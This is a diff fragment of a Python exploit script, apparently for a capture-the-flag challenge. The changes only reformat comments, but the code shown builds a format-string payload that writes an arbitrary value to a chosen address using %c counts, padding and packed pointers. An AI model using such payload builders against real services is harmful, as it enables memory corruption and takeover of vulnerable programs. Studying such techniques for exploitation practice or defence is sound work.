@@ -42,7 +42,7 @@ def build_write(offset, addr, value):
     lo = value & 0xFFFF
     hi = (value >> 16) & 0xFFFF
     order = [(addr, lo), (addr + 2, hi)]
-    order.sort(key=lambda t: t[1])          # ascending so %c counts only grow
+    order.sort(key=lambda t: t[1])  # ascending so %c counts only grow
 
     def make(base):
         s, cur = b"", 0
@@ -56,14 +56,15 @@ def build_write(offset, addr, value):
 
     for guess in range(offset, offset + 40):
         s = make(guess)
-        s += b"A" * ((-len(s)) % 8)          # pad format section to 8 bytes
+        s += b"A" * ((-len(s)) % 8)  # pad format section to 8 bytes
         base_arg = offset + len(s) // 8
-        if base_arg == guess:                # fixpoint: pointers sit at `guess`
+        if base_arg == guess:  # fixpoint: pointers sit at `guess`
             return s + b"".join(struct.pack("<Q", a) for a, _ in order)
     raise RuntimeError("could not find a stable payload layout")
 
-MARKER = b"MARKER!!"          # 8 bytes, aligned when placed first
-MARKER_HEX = u64(MARKER)      # 0x2121... little-endian view we search for
+
+MARKER = b"MARKER!!"  # 8 bytes, aligned when placed first
+MARKER_HEX = u64(MARKER)  # 0x2121... little-endian view we search for
 
 
 def connect():
